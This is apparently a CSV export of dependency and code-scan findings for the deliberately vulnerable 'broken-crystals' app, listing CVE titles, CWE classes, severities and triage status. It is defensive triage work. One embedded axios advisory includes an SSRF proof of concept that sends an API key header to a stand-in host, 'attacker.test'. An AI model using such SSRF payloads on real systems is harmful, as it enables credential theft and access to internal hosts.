GRP-broken-crystals-CWE-770-807,trivy,broken-crystals,CWE-770,medium,libnghttp2-14@1.36.0-2+deb10u1,nghttp2: CONTINUATION frames DoS,pending,low,no,1
GRP-broken-crystals-CWE-770-808,trivy,broken-crystals,CWE-770,low,libopenjp2-7@2.3.0-2+deb10u2,openjpeg: DoS via memory exhaustion in opj_decompress,pending,low,no,1
GRP-broken-crystals-CWE-770-809,trivy,broken-crystals,CWE-770,low,libopenjp2-7-dev@2.3.0-2+deb10u2,openjpeg: DoS via memory exhaustion in opj_decompress,pending,low,no,1
GRP-broken-crystals-CWE-770-810,trivy,broken-crystals,CWE-770,medium,libssl-dev@1.1.1n-0+deb10u4,openssl: Possible DoS translating ASN.1 object identifiers,pending,low,no,1
GRP-broken-crystals-CWE-770-811,trivy,broken-crystals,CWE-770,medium,libssl1.1@1.1.1n-0+deb10u4,openssl: Possible DoS translating ASN.1 object identifiers,pending,low,no,1
GRP-broken-crystals-CWE-770-812,trivy,broken-crystals,CWE-770,high,libsystemd0@241-7~deb10u9,bind9: KeyTrap - Extreme CPU consumption in DNSSEC validator,pending,low,no,1
GRP-broken-crystals-CWE-770-813,trivy,broken-crystals,CWE-770,high,libudev1@241-7~deb10u9,bind9: KeyTrap - Extreme CPU consumption in DNSSEC validator,pending,low,no,1
GRP-broken-crystals-CWE-770-814,trivy,broken-crystals,CWE-770,high,libunbound8@1.9.0-2+deb10u3,bind9: KeyTrap - Extreme CPU consumption in DNSSEC validator,pending,low,no,1
GRP-broken-crystals-CWE-770-815,trivy,broken-crystals,CWE-770,medium,linux-libc-dev@4.19.269-1,kernel: memcg does not limit the number of POSIX file locks allowing memory exhaustion,pending,low,no,1
GRP-broken-crystals-CWE-770-816,trivy,broken-crystals,CWE-770,medium,openssl@1.1.1n-0+deb10u4,openssl: Possible DoS translating ASN.1 object identifiers,pending,low,no,1
GRP-broken-crystals-CWE-770-817,trivy,broken-crystals,CWE-770,high,@fastify/multipart@7.4.1,Unlimited consumption of resources in @fastify/multipart,pending,low,no,1
GRP-broken-crystals-CWE-770-818,trivy,broken-crystals,CWE-770,low,fastify@4.13.0,Fastify: Fastify: Denial of Service via unbounded buffering in Web Streams response handling,pending,low,no,1
GRP-broken-crystals-CWE-770-819,trivy,broken-crystals,CWE-770,medium,undici@5.21.0,undici: Undici: Denial of Service via excessive decompression steps,pending,low,no,1
GRP-broken-crystals-CWE-772-820,trivy,broken-crystals,CWE-772,high,curl@7.64.0-4+deb10u5,curl: HTTP/2 push headers memory-leak,pending,low,no,1
GRP-broken-crystals-CWE-772-821,trivy,broken-crystals,CWE-772,high,libcurl3-gnutls@7.64.0-4+deb10u5,curl: HTTP/2 push headers memory-leak,pending,low,no,1
GRP-broken-crystals-CWE-772-822,trivy,broken-crystals,CWE-772,high,libcurl4@7.64.0-4+deb10u5,curl: HTTP/2 push headers memory-leak,pending,low,no,1
GRP-broken-crystals-CWE-772-823,trivy,broken-crystals,CWE-772,high,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: HTTP/2 push headers memory-leak,pending,low,no,1
GRP-broken-crystals-CWE-772-824,trivy,broken-crystals,CWE-772,medium,linux-libc-dev@4.19.269-1,kernel: task processes not being properly ended could lead to resource exhaustion,pending,low,no,1
GRP-broken-crystals-CWE-78-825,npm-audit,broken-crystals,CWE-78,high,glob,glob CLI: Command injection via -c/--cmd executes matches with shell:true,TP,medium,yes,1
GRP-broken-crystals-CWE-78-826,trivy,broken-crystals,CWE-78,medium,openssh-client@1:7.9p1-10+deb10u2,openssh: potential command injection via shell metacharacters,TP,medium,yes,1
GRP-broken-crystals-CWE-787-827,trivy,broken-crystals,CWE-787,high,gir1.2-gdkpixbuf-2.0@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-828,trivy,broken-crystals,CWE-787,high,libc-bin@2.28-10+deb10u2,glibc: array overflow in backtrace functions for powerpc,pending,low,no,1
GRP-broken-crystals-CWE-787-829,trivy,broken-crystals,CWE-787,high,libc-dev-bin@2.28-10+deb10u2,glibc: array overflow in backtrace functions for powerpc,pending,low,no,1
GRP-broken-crystals-CWE-787-830,trivy,broken-crystals,CWE-787,high,libc6@2.28-10+deb10u2,glibc: array overflow in backtrace functions for powerpc,pending,low,no,1
GRP-broken-crystals-CWE-787-831,trivy,broken-crystals,CWE-787,high,libc6-dev@2.28-10+deb10u2,glibc: array overflow in backtrace functions for powerpc,pending,low,no,1
GRP-broken-crystals-CWE-787-832,trivy,broken-crystals,CWE-787,high,libde265-0@1.0.11-0+deb10u4,Libde265 v1.0.11 was discovered to contain a heap buffer overflow via ...,pending,low,no,1
GRP-broken-crystals-CWE-787-833,trivy,broken-crystals,CWE-787,medium,libelf1@0.176-1.1,The libcpu component which is used by libasm of elfutils version 0.177 ...,pending,low,no,1
GRP-broken-crystals-CWE-787-834,trivy,broken-crystals,CWE-787,high,libgdk-pixbuf2.0-0@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-835,trivy,broken-crystals,CWE-787,high,libgdk-pixbuf2.0-bin@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-836,trivy,broken-crystals,CWE-787,high,libgdk-pixbuf2.0-common@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-837,trivy,broken-crystals,CWE-787,high,libgdk-pixbuf2.0-dev@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-838,trivy,broken-crystals,CWE-787,medium,libjpeg-dev@1:1.5.2-2+deb10u1,libjpeg-turbo: heap buffer overflow in get_word_rgb_row() in rdppm.c,pending,low,no,1
GRP-broken-crystals-CWE-787-839,trivy,broken-crystals,CWE-787,medium,libjpeg62-turbo@1:1.5.2-2+deb10u1,libjpeg-turbo: heap buffer overflow in get_word_rgb_row() in rdppm.c,pending,low,no,1
GRP-broken-crystals-CWE-787-840,trivy,broken-crystals,CWE-787,medium,libjpeg62-turbo-dev@1:1.5.2-2+deb10u1,libjpeg-turbo: heap buffer overflow in get_word_rgb_row() in rdppm.c,pending,low,no,1
GRP-broken-crystals-CWE-787-841,trivy,broken-crystals,CWE-787,low,liblz4-1@1.8.3-1+deb10u1,lz4: heap-based buffer overflow in LZ4_write32,pending,low,no,1
GRP-broken-crystals-CWE-787-842,trivy,broken-crystals,CWE-787,high,libncurses-dev@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-843,trivy,broken-crystals,CWE-787,high,libncurses5-dev@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-844,trivy,broken-crystals,CWE-787,high,libncurses6@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-845,trivy,broken-crystals,CWE-787,high,libncursesw5-dev@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-846,trivy,broken-crystals,CWE-787,high,libncursesw6@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-847,trivy,broken-crystals,CWE-787,high,libopenjp2-7@2.3.0-2+deb10u2,openjpeg: heap-buffer-overflow in color.c may lead to DoS or arbitrary code execution,pending,low,no,1
GRP-broken-crystals-CWE-787-848,trivy,broken-crystals,CWE-787,high,libopenjp2-7-dev@2.3.0-2+deb10u2,openjpeg: heap-buffer-overflow in color.c may lead to DoS or arbitrary code execution,pending,low,no,1
GRP-broken-crystals-CWE-787-849,trivy,broken-crystals,CWE-787,high,libssh2-1@1.8.0-2.1,libssh2: use-of-uninitialized-value in _libssh2_transport_read,pending,low,no,1
GRP-broken-crystals-CWE-787-850,trivy,broken-crystals,CWE-787,high,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: TIFFRasterScanlineSize64 produce too-big size and could cause OOM,pending,low,no,1
GRP-broken-crystals-CWE-787-851,trivy,broken-crystals,CWE-787,high,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: TIFFRasterScanlineSize64 produce too-big size and could cause OOM,pending,low,no,1
GRP-broken-crystals-CWE-787-852,trivy,broken-crystals,CWE-787,high,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: TIFFRasterScanlineSize64 produce too-big size and could cause OOM,pending,low,no,1
GRP-broken-crystals-CWE-787-853,trivy,broken-crystals,CWE-787,high,libtinfo6@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-854,trivy,broken-crystals,CWE-787,high,libwebp-dev@0.6.1-2+deb10u1,libwebp: Heap buffer overflow in WebP Codec,pending,low,no,1
GRP-broken-crystals-CWE-787-855,trivy,broken-crystals,CWE-787,high,libwebp6@0.6.1-2+deb10u1,libwebp: Heap buffer overflow in WebP Codec,pending,low,no,1
GRP-broken-crystals-CWE-787-856,trivy,broken-crystals,CWE-787,high,libwebpdemux2@0.6.1-2+deb10u1,libwebp: Heap buffer overflow in WebP Codec,pending,low,no,1
GRP-broken-crystals-CWE-787-857,trivy,broken-crystals,CWE-787,high,libwebpmux3@0.6.1-2+deb10u1,libwebp: Heap buffer overflow in WebP Codec,pending,low,no,1
GRP-broken-crystals-CWE-787-858,trivy,broken-crystals,CWE-787,medium,libx11-6@2:1.6.7-1+deb10u2,libX11: out-of-bounds memory access in _XkbReadKeySyms(),pending,low,no,1
GRP-broken-crystals-CWE-787-859,trivy,broken-crystals,CWE-787,medium,libx11-data@2:1.6.7-1+deb10u2,libX11: out-of-bounds memory access in _XkbReadKeySyms(),pending,low,no,1
GRP-broken-crystals-CWE-787-860,trivy,broken-crystals,CWE-787,medium,libx11-dev@2:1.6.7-1+deb10u2,libX11: out-of-bounds memory access in _XkbReadKeySyms(),pending,low,no,1
GRP-broken-crystals-CWE-787-861,trivy,broken-crystals,CWE-787,high,linux-libc-dev@4.19.269-1,kernel: out-of-bounds write in __remove_dirty_segment in fs/f2fs/segment.c,pending,low,no,1
GRP-broken-crystals-CWE-787-862,trivy,broken-crystals,CWE-787,high,ncurses-base@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-863,trivy,broken-crystals,CWE-787,high,ncurses-bin@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-79-864,dep-check,broken-crystals,CWE-79,high,@remix-run/router:1.19.2,"React Router (and Remix v1/v2) SPA open navigation redirects originating from loaders or actions in [Framework Mode](https://reactrouter.com/start/modes#framework), [Data Mode](https://reactrouter.com/start/modes#data), or the unstable RSC modes can result in unsafe URLs causing unintended javascript execution on the client. This is only an issue if developers are creating redirect paths from untrusted content or via an open redirect. > [!NOTE] > This does not impact applications that use [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`).",TP,medium,yes,1
GRP-broken-crystals-CWE-79-865,dep-check,broken-crystals,CWE-79,medium,bootstrap.min.js,"In Bootstrap before 4.1.2, XSS is possible in the collapse data-parent attribute.",TP,medium,yes,1
GRP-broken-crystals-CWE-79-866,dep-check,broken-crystals,CWE-79,medium,jquery.min.js,"In jQuery versions greater than or equal to 1.2 and before 3.5.0, passing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code. This problem is patched in jQuery 3.5.0.",TP,medium,yes,1
GRP-broken-crystals-CWE-79-867,trivy,broken-crystals,CWE-79,medium,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: Incorrect server side include parsing can lead to XSS,TP,medium,yes,1
GRP-broken-crystals-CWE-79-868,trivy,broken-crystals,CWE-79,medium,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: Incorrect server side include parsing can lead to XSS,TP,medium,yes,1
GRP-broken-crystals-CWE-79-869,trivy,broken-crystals,CWE-79,low,send@0.17.2,send: Code Execution Vulnerability in Send Library,TP,medium,yes,1
GRP-broken-crystals-CWE-79-870,bearer,broken-crystals,CWE-79,info,client/src/pages/main/Contact.tsx:8,"## Description Unsanitized user input in dynamic HTML insertion can lead to Cross-Site Scripting (XSS) attacks. This vulnerability arises when user-provided data is directly inserted into the DOM without proper sanitization, potentially allowing attackers to execute malicious scripts. ## Remediations - **Do** use an HTML sanitization library to clean user input before inserting it into the HTML. This step helps prevent XSS attacks by removing or neutralizing any potentially harmful scripts. ```javascript import sanitizeHtml from 'sanitize-html'; const html = `<strong>${user.Input}</strong>`; document.body.innerHTML = sanitizeHtml(html); ``` ## References - [OWASP XSS explained](https://owasp.org/www-community/attacks/xss/)",TP,medium,yes,1
GRP-broken-crystals-CWE-79-871,bearer,broken-crystals,CWE-79,info,client/src/pages/marketplace/Marketplace.tsx:126,"## Description Unsanitized user input in dynamic HTML insertion can lead to Cross-Site Scripting (XSS) attacks. This vulnerability arises when user-provided data is directly inserted into the DOM without proper sanitization, potentially allowing attackers to execute malicious scripts. ## Remediations - **Do** use an HTML sanitization library to clean user input before inserting it into the HTML. This step helps prevent XSS attacks by removing or neutralizing any potentially harmful scripts. ```javascript import sanitizeHtml from 'sanitize-html'; const html = `<strong>${user.Input}</strong>`; document.body.innerHTML = sanitizeHtml(html); ``` ## References - [OWASP XSS explained](https://owasp.org/www-community/attacks/xss/)",TP,medium,yes,1
GRP-broken-crystals-CWE-79-872,bearer,broken-crystals,CWE-79,info,client/src/pages/chat/ChatWidget.tsx:7,"## Description Using React's dangerouslySetInnerHTML with unsanitized data can introduce Cross-Site Scripting (XSS) vulnerabilities. This occurs when external input is embedded directly into the HTML without proper sanitization, allowing attackers to inject malicious scripts. ## Remediations - **Do** sanitize data before using it with dangerouslySetInnerHTML. This step is crucial to prevent XSS attacks by ensuring that the input does not contain harmful scripts. ```javascript <div dangerouslySetInnerHTML={{__html: sanitize(data)}} /> ``` ## References - [OWASP Cross-Site Scripting (XSS) Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",TP,medium,yes,1
GRP-broken-crystals-CWE-79-873,bearer,broken-crystals,CWE-79,info,client/src/pages/hidden/HiddenUpload.tsx:132,"## Description Using React's dangerouslySetInnerHTML with unsanitized data can introduce Cross-Site Scripting (XSS) vulnerabilities. This occurs when external input is embedded directly into the HTML without proper sanitization, allowing attackers to inject malicious scripts. ## Remediations - **Do** sanitize data before using it with dangerouslySetInnerHTML. This step is crucial to prevent XSS attacks by ensuring that the input does not contain harmful scripts. ```javascript <div dangerouslySetInnerHTML={{__html: sanitize(data)}} /> ``` ## References - [OWASP Cross-Site Scripting (XSS) Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",TP,medium,yes,1
GRP-broken-crystals-CWE-798-874,bearer,broken-crystals,CWE-798,info,client/src/pages/marketplace/Partners/Partners.tsx:14,"## Description Storing secrets directly in your code is a security risk. Instead, opt for environment variables or a secret management system to safeguard your secrets. ## Remediations - **Do not** store plaintext secrets in your code. This exposes sensitive information to unnecessary risk. ```javascript passport.use(new OAuth2Strategy({ authorizationURL: 'https://www.example.com/oauth2/authorize', tokenURL: 'https://www.example.com/oauth2/token', clientID: 'my-id-123', clientSecret: 'shh-my-secret', callbackURL: 'http://localhost:3000/auth/example/callback' }, function(accessToken, refreshToken, profile, cb) { User.findOrCreate({ exampleId: profile.id }, function (err, user) { return cb(err, user); }); } )); ``` - **Do** use environment variables to store sensitive information such as secrets. This method keeps credentials out of your codebase and makes them easier to manage securely. - **Do** consider implementing a key-management system to securely handle secrets and other sensitive information. This approach provides enhanced security measures for managing and accessing credentials. ## References - [OWASP hardcoded passwords](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password) - [Google Cloud Key Management Service](https://cloud.google.com/kms/docs) - [AWS Key Management Service](https://aws.amazon.com/kms/)",pending,low,no,1
GRP-broken-crystals-CWE-798-875,bearer,broken-crystals,CWE-798,info,src/auth/auth.controller.ts:166,"## Description Storing secrets directly in your code is a security risk. Instead, opt for environment variables or a secret management system to safeguard your secrets. ## Remediations - **Do not** store plaintext secrets in your code. This exposes sensitive information to unnecessary risk. ```javascript passport.use(new OAuth2Strategy({ authorizationURL: 'https://www.example.com/oauth2/authorize', tokenURL: 'https://www.example.com/oauth2/token', clientID: 'my-id-123', clientSecret: 'shh-my-secret', callbackURL: 'http://localhost:3000/auth/example/callback' }, function(accessToken, refreshToken, profile, cb) { User.findOrCreate({ exampleId: profile.id }, function (err, user) { return cb(err, user); }); } )); ``` - **Do** use environment variables to store sensitive information such as secrets. This method keeps credentials out of your codebase and makes them easier to manage securely. - **Do** consider implementing a key-management system to securely handle secrets and other sensitive information. This approach provides enhanced security measures for managing and accessing credentials. ## References - [OWASP hardcoded passwords](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password) - [Google Cloud Key Management Service](https://cloud.google.com/kms/docs) - [AWS Key Management Service](https://aws.amazon.com/kms/)",pending,low,no,1
GRP-broken-crystals-CWE-824-876,trivy,broken-crystals,CWE-824,medium,krb5-multidev@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-877,trivy,broken-crystals,CWE-824,medium,libgssapi-krb5-2@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-878,trivy,broken-crystals,CWE-824,medium,libgssrpc4@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-879,trivy,broken-crystals,CWE-824,medium,libk5crypto3@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-880,trivy,broken-crystals,CWE-824,medium,libkadm5clnt-mit11@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-881,trivy,broken-crystals,CWE-824,medium,libkadm5srv-mit11@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-882,trivy,broken-crystals,CWE-824,medium,libkdb5-9@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-883,trivy,broken-crystals,CWE-824,medium,libkrb5-3@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-884,trivy,broken-crystals,CWE-824,medium,libkrb5-dev@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-885,trivy,broken-crystals,CWE-824,medium,libkrb5support0@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-833-886,trivy,broken-crystals,CWE-833,medium,linux-libc-dev@4.19.269-1,kernel: blocking operation in dvb_frontend_get_event and wait_event_interruptible,pending,low,no,1
GRP-broken-crystals-CWE-834-887,trivy,broken-crystals,CWE-834,medium,libopenjp2-7@2.3.0-2+deb10u2,openjpeg: denial of service in function opj_t1_encode_cblks in openjp2/t1.c,pending,low,no,1
GRP-broken-crystals-CWE-834-888,trivy,broken-crystals,CWE-834,medium,libopenjp2-7-dev@2.3.0-2+deb10u2,openjpeg: denial of service in function opj_t1_encode_cblks in openjp2/t1.c,pending,low,no,1
GRP-broken-crystals-CWE-835-889,npm-audit,broken-crystals,CWE-835,info,bn.js,bn.js affected by an infinite loop,pending,low,no,1
GRP-broken-crystals-CWE-835-890,dep-check,broken-crystals,CWE-835,info,bn.js:4.12.0,"This affects versions of the package bn.js before 4.12.3 and 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely.",pending,low,no,1
GRP-broken-crystals-CWE-835-891,dep-check,broken-crystals,CWE-835,info,nanoid:3.3.7,"When nanoid is called with a fractional value, there were a number of undesirable effects: 1. in browser and non-secure, the code infinite loops on while (size--) 2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled 3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error Version 3.3.8 and 5.0.9 are fixed.",pending,low,no,1
GRP-broken-crystals-CWE-835-892,trivy,broken-crystals,CWE-835,low,libcairo-gobject2@1.16.0-4+deb10u1,cairo: infinite loop in the function _arc_error_normalized in the file cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-835-893,trivy,broken-crystals,CWE-835,low,libcairo-script-interpreter2@1.16.0-4+deb10u1,cairo: infinite loop in the function _arc_error_normalized in the file cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-835-894,trivy,broken-crystals,CWE-835,low,libcairo2@1.16.0-4+deb10u1,cairo: infinite loop in the function _arc_error_normalized in the file cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-835-895,trivy,broken-crystals,CWE-835,low,libcairo2-dev@1.16.0-4+deb10u1,cairo: infinite loop in the function _arc_error_normalized in the file cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-835-896,trivy,broken-crystals,CWE-835,low,libcroco3@0.6.12-3,libcroco: Infinite loop in the cr_parser_parse_selector_core function,pending,low,no,1
GRP-broken-crystals-CWE-835-897,trivy,broken-crystals,CWE-835,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: infinite loop in the tarfile module via crafted TAR archive,pending,low,no,1
GRP-broken-crystals-CWE-835-898,trivy,broken-crystals,CWE-835,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: infinite loop in the tarfile module via crafted TAR archive,pending,low,no,1
GRP-broken-crystals-CWE-835-899,trivy,broken-crystals,CWE-835,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: urllib: HTTP client possible infinite loop on a 100 Continue response,pending,low,no,1
GRP-broken-crystals-CWE-835-900,trivy,broken-crystals,CWE-835,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: urllib: HTTP client possible infinite loop on a 100 Continue response,pending,low,no,1
GRP-broken-crystals-CWE-835-901,trivy,broken-crystals,CWE-835,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: infinite loop via a crafted TIFF file,pending,low,no,1
GRP-broken-crystals-CWE-835-902,trivy,broken-crystals,CWE-835,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: infinite loop via a crafted TIFF file,pending,low,no,1
GRP-broken-crystals-CWE-835-903,trivy,broken-crystals,CWE-835,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: infinite loop via a crafted TIFF file,pending,low,no,1
GRP-broken-crystals-CWE-835-904,trivy,broken-crystals,CWE-835,high,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: Infinite recursion in parameter entities,pending,low,no,1
GRP-broken-crystals-CWE-835-905,trivy,broken-crystals,CWE-835,high,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: Infinite recursion in parameter entities,pending,low,no,1
GRP-broken-crystals-CWE-835-906,trivy,broken-crystals,CWE-835,medium,linux-libc-dev@4.19.269-1,kernel: batman-adv: Avoid infinite loop trying to resize local TT,pending,low,no,1
GRP-broken-crystals-CWE-835-907,trivy,broken-crystals,CWE-835,high,python2.7@2.7.16-2+deb10u1,python: infinite loop in the tarfile module via crafted TAR archive,pending,low,no,1
GRP-broken-crystals-CWE-835-908,trivy,broken-crystals,CWE-835,high,python2.7-minimal@2.7.16-2+deb10u1,python: infinite loop in the tarfile module via crafted TAR archive,pending,low,no,1
GRP-broken-crystals-CWE-835-909,trivy,broken-crystals,CWE-835,high,python3.7@3.7.3-2+deb10u4,python: urllib: HTTP client possible infinite loop on a 100 Continue response,pending,low,no,1
GRP-broken-crystals-CWE-835-910,trivy,broken-crystals,CWE-835,high,python3.7-minimal@3.7.3-2+deb10u4,python: urllib: HTTP client possible infinite loop on a 100 Continue response,pending,low,no,1
GRP-broken-crystals-CWE-835-911,trivy,broken-crystals,CWE-835,medium,bn.js@4.12.0,bn.js: bn.js: Denial of Service via calling maskn(0),pending,low,no,1
GRP-broken-crystals-CWE-843-912,npm-audit,broken-crystals,CWE-843,critical,libxmljs,libxmljs vulnerable to type confusion when parsing specially crafted XML,pending,low,no,1
GRP-broken-crystals-CWE-843-913,dep-check,broken-crystals,CWE-843,critical,libxmljs:1.0.11,"libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking a function on the result of `attrs()` that was called on a parsed node. This vulnerability might lead to denial of service (on both 32-bit systems and 64-bit systems), data leak, infinite loop and remote code execution (on 32-bit systems with the XML_PARSE_HUGE flag enabled).",pending,low,no,1
GRP-broken-crystals-CWE-843-914,trivy,broken-crystals,CWE-843,high,linux-libc-dev@4.19.269-1,kernel: Type confusion in pick_next_rt_entity(),pending,low,no,1
GRP-broken-crystals-CWE-843-915,trivy,broken-crystals,CWE-843,critical,libxmljs@0.19.7,libxmljs vulnerable to type confusion when parsing specially crafted XML,pending,low,no,1
GRP-broken-crystals-CWE-89-916,trivy,broken-crystals,CWE-89,high,libpq-dev@11.19-0+deb10u1,postgresql: extension script @substitutions@ within quoting allow SQL injection,TP,medium,yes,1
GRP-broken-crystals-CWE-89-917,trivy,broken-crystals,CWE-89,high,libpq5@11.19-0+deb10u1,postgresql: extension script @substitutions@ within quoting allow SQL injection,TP,medium,yes,1
GRP-broken-crystals-CWE-89-918,trivy,broken-crystals,CWE-89,high,knex@0.21.19,Knex.js has a limited SQL injection vulnerability,TP,medium,yes,1
GRP-broken-crystals-CWE-908-919,trivy,broken-crystals,CWE-908,high,linux-libc-dev@4.19.269-1,kernel: btrfs: fix information leak in btrfs_ioctl_logical_to_ino(),pending,low,no,1
GRP-broken-crystals-CWE-909-920,trivy,broken-crystals,CWE-909,medium,linux-libc-dev@4.19.269-1,kernel: llc: Drop support for ETH_P_TR_802_2.,pending,low,no,1
GRP-broken-crystals-CWE-911-921,trivy,broken-crystals,CWE-911,high,linux-libc-dev@4.19.269-1,kernel: AoE: improper reference count leads to use-after-free vulnerability,pending,low,no,1
GRP-broken-crystals-CWE-918-922,npm-audit,broken-crystals,CWE-918,high,axios,axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL,TP,medium,yes,1
GRP-broken-crystals-CWE-918-923,npm-audit,broken-crystals,CWE-918,high,webpack,webpack buildHttp: allowedUris allow-list bypass via URL userinfo (@) leading to build-time SSRF behavior,TP,medium,yes,1
GRP-broken-crystals-CWE-918-924,dep-check,broken-crystals,CWE-918,high,axios:1.7.7,"### Summary A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463 A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios. ### Details Consider the following code snippet: ```js import axios from ""axios""; const internalAPIClient = axios.create({ baseURL: ""http://example.test/api/v1/users/"", headers: { ""X-API-KEY"": ""1234567890"", }, }); // const userId = ""123""; const userId = ""http://attacker.test/""; await internalAPIClient.get(userId); // SSRF ``` In this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers. It is recommended that: - When `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`. - Before sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`. ### PoC Follow the steps below to reproduce the issue: 1. Set up two simple HTTP servers: ``` mkdir /tmp/server1 /tmp/server2 echo ""this is server1"" > /tmp/server1/index.html echo ""this is server2"" > /tmp/server2/index.html python -m http.server -d /tmp/server1 10001 & python -m http.server -d /tmp/server2 10002 & ``` 2. Create a script (e.g., main.js): ```js import axios from ""axios""; const client = axios.create({ baseURL: ""http://localhost:10001/"" }); const response = await client.get(""http://localhost:10002/""); console.log(response.data); ``` 3. Run the script: ``` $ node main.js this is server2 ``` Even though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`. ### Impact - Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed. - SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running. - Affected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",TP,medium,yes,1
GRP-broken-crystals-CWE-918-925,dep-check,broken-crystals,CWE-918,low,webpack:5.96.1,"### Summary When `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) enforces `allowedUris` only for the **initial** URL, but **does not re-validate `allowedUris` after following HTTP 30x redirects**. As a result, an import that appears restricted to a trusted allow-list can be redirected to **HTTP(S) URLs outside the allow-list**. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion in build outputs** (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache. ### Details In the HTTP scheme resolver, the allow-list check (`allowedUris`) is performed when metadata/info is created for the original request (via `getInfo()`), but the content-fetch path follows redirects by resolving the 